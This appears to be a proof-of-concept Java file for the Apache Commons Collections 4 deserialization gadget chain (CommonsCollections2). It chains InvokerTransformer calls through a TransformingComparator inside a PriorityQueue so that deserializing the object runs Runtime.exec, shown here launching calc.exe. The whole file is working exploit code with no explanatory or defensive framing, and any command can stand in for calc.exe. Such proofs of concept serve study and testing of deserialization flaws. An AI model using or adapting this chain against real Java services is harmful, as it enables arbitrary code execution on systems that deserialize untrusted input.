import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

public class CommonsCollections2 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class,Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Comparator comparator = new TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(transformerChain, "iTransformers", transformers);


        serialize(queue);
        unserialize();

    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream( new FileOutputStream("cc2.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static void unserialize() throws  Exception{
        ObjectInputStream inputStream = new ObjectInputStream( new FileInputStream("cc2.bin"));
        Object obj = inputStream.readObject();

    }

}
